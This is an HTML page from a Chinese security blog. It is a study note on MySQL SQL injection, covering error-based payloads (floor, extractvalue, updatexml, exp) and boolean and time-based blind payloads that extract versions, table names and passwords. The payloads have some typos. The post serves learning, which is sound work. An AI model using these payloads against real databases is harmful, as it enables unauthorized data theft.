@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="一个小白进阶的历程">
+    <meta name="author" content="Camser">
+    
+    <title>
+        
+            夯实基础之sql注入篇 |
+        
+        Camser&#39;s Blog
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"yoursite.com","root":"/","language":"zh-Hans"};
+    KEEP.theme_config = {"toc":{"enable":false,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/Misaka.jpg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true,"trigger":"auto","unescape":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.0"};
+    KEEP.language_ago = undefined;
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                Camser&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">夯实基础之sql注入篇</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/Misaka.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Camser</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2018-08-05 17:23:54
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<h2 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h2><h3 id="mysql基本命令学习"><a href="#mysql基本命令学习" class="headerlink" title="mysql基本命令学习"></a>mysql基本命令学习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br><span class="line"></span><br><span class="line">例:select mid(user,2,2) from users;</span><br><span class="line">users表中的user字段中，起始位置为2，返回两个字符</span><br></pre></td></tr></table></figure>
+<p><img src="/uploads/sqllearn1.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from table limit m,n;</span><br><span class="line"></span><br><span class="line">例:select * from users limit 0,2;</span><br><span class="line">users中，起始位置为第一行(0),返回两行数据。</span><br></pre></td></tr></table></figure>
+<p><img src="/uploads/sqllearn2.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">concat:MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL.</span><br><span class="line">concat_ws:concat_ws函数在执行的时候,不会因为NULL值而返回NULL,根据第一个字符将后面的字符串接起来.</span><br><span class="line">group_concat:group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator &#x27;分隔符&#x27;] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/uploads/sqllearn3.png" alt="1"><br><img src="/uploads/sqllearn4.png" alt="1"><br><img src="/uploads/sqllearn5.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users</span><br><span class="line">count()聚合函数，统计users表中行数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br><span class="line">产生一个0~1的随机数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select floor(123.456)</span><br><span class="line">向下取整，得123</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users group by user;</span><br><span class="line">按照user进行分组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/uploads/sqllearn6.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select length(&#x27;hello&#x27;);</span><br><span class="line">返回字符串长度，如上返回5.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#x27;abcd&#x27;,2,3);</span><br><span class="line">截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）,如上返回bcd.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#x27;a&#x27;)</span><br><span class="line">返回字符串ascii，如上返回97.</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</span><br><span class="line"></span><br><span class="line">此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的</span><br><span class="line">重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时</span><br><span class="line">重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需</span><br><span class="line">要多试几次才行。</span><br><span class="line"></span><br><span class="line">以上语句可以简化成如下的形式。</span><br><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br><span class="line">如果关键的表被禁用了，可以使用这种形式</span><br><span class="line">select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</span><br><span class="line">如果 rand 被禁用了可以使用用户变量来报错</span><br><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="exp报错注入"><a href="#exp报错注入" class="headerlink" title="exp报错注入"></a>exp报错注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elect exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围</span><br><span class="line">//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上</span><br></pre></td></tr></table></figure>
+<h4 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e)) //mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema=database() limit 3,1)));</span><br><span class="line"></span><br><span class="line">获取字段</span><br><span class="line">select extractvalue(1, concat(0x5c,(select password from users limit 1,1)));ERROR 1105 (HY000): XPATH syntax error: &#x27;\I-kill-you&#x27;mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 0,1)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 3,1)),0);</span><br><span class="line"></span><br><span class="line">获取字段</span><br><span class="line">select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&#x27;users&#x27; limit 4,1)),0);</span><br><span class="line"></span><br><span class="line">获取内容</span><br><span class="line">select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 0,1)),0);ERROR 1105 (HY000): XPATH syntax error: &#x27;~Dumb&#x27;mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 1,1)),0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="基于布尔sql盲注"><a href="#基于布尔sql盲注" class="headerlink" title="基于布尔sql盲注"></a>基于布尔sql盲注</h3><p>通过构造sql语句，通过判断语句是否执行成功来对数据进行猜解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;’s’ //left()函数</span><br><span class="line">Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ </span><br><span class="line">Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值</span><br><span class="line"></span><br><span class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23 //ord()函数，mid()函数</span><br><span class="line">Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位,Ord()函数同 ascii()，将字符转为 ascii 值</span><br><span class="line"></span><br><span class="line">regexp 正则注入</span><br><span class="line">用法介绍：select user() regexp &#x27;^[a-z]&#x27;;</span><br><span class="line">Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。</span><br><span class="line">第二位可以用 select user() regexp &#x27;^ro&#x27;来进行。</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h3><p>当对数据库进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0。但是如果查询语句的条件不存在，执行的时间便是0，利用该函数这样一个特殊的性质，可以利用时间延迟来判断我们查询的是否存在。这便是SQL基于时间延迟的盲注的工作原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句，条件为假，</span><br><span class="line">执行 sleep</span><br><span class="line">Ps： 遇到以下这种利用 sleep()延时注入语句</span><br><span class="line">select sleep(find_in_set(mid(@@version, 1, 1), &#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;));</span><br><span class="line">该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</span><br><span class="line"></span><br><span class="line">union select if(substring(current,1,1)=char(119),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null) from (select database() as current) as tb1;</span><br><span class="line">//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()函数进行注入。</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2018/08/16/Upload-labs/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Upload-labs</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2018/08/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%B9%E8%AE%AD%E7%9A%84web%E9%A2%98/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">记一次培训的web题</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Camser</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.0</a>
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/header-shrink.js"></script><script src="/js/back2top.js"></script><script src="/js/dark-light-toggle.js"></script>
+
+
+    <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+<div class="post-scripts">
+    
+</div>
+
+
+
+</body>
+</html>
